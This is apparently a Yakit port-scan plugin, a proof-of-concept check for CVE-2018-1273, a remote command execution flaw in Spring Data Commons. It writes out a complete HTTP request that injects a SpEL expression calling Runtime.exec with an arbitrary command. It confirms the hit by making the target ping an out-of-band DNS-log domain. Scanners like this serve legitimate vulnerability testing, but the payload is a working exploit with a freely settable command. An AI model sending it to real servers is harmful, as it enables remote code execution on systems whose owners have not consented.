# port scan plugin
yakit.AutoInitYakit()
//Spring Data Commons CVE-2018-1273远程命令执行漏洞
//Spring_Data_Commons_CVE-2018-1273_poc.yak
//默认调用portscan扫描
handleCheck = func(target,port,command,token){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `POST /users?page=&size=5 HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 46
Content-Type: application/x-www-form-urlencoded
Origin: http://{{params(target)}}
Referer: http://{{params(target)}}/users?page=&size=5
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("{{params(command)}}")]=&password=&repeatedPassword=`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"command":command}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            yakit.Info("%v found Spring Data Commons CVE-2018-1273远程命令执行漏洞", addr)
            println(dnsdata)
            risk.NewRisk(
            addr,risk.title("CVE-2018-1273"),
            risk.severity("high"),
            risk.titleVerbose("Spring Data Commons CVE-2018-1273远程命令执行漏洞"),
            risk.type("rce[Confluence]"),
            risk.payload(`username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("dnslog")]=&password=&repeatedPassword=`),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    server, token, err = risk.NewDNSLogDomain()
    command = str.f("ping -c 2 %v", server)
    yakit.Info(command)
    log.info(command)
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port,command,token)
    }
    
}
